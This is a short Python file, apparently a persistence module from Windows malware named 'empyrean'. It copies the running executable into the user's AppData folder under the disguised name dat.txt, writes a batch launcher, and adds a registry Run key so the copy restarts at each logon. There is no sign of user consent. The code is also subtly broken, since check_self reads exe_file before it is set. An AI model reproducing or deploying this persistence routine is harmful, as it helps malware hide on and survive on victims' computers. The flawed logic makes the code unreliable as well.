import subprocess
import os
import shutil
import sys


class Startup:
    def __init__(self) -> None:
        self.working_dir = os.getenv("APPDATA") + "\\empyrean"

        if self.check_self():
            return

        self.mkdir()
        self.exe_file = os.path.realpath(self.working_dir + "\\dat.txt")
        self.write_stub()
        self.regedit()

    def check_self(self) -> bool:
        return os.path.realpath(sys.executable) == self.exe_file

    def mkdir(self) -> str:
        if not os.path.isdir(self.working_dir):
            os.mkdir(self.working_dir)

        else:
            shutil.rmtree(self.working_dir)
            os.mkdir(self.working_dir)

    def write_stub(self) -> None:
        shutil.copy2(os.path.realpath(sys.executable),
                     self.exe_file)

        with open(file=f"{self.working_dir}\\run.bat", mode="w") as f:
            f.write(f'@echo off\nstart "" "{self.exe_file}"')

    def regedit(self) -> None:
        subprocess.run(args=[
                       "reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "empyrean", "/f"], shell=True)
        subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                       "/v", "empyrean", "/t", "REG_SZ", "/d", self.exe_file, "/f"], shell=True)
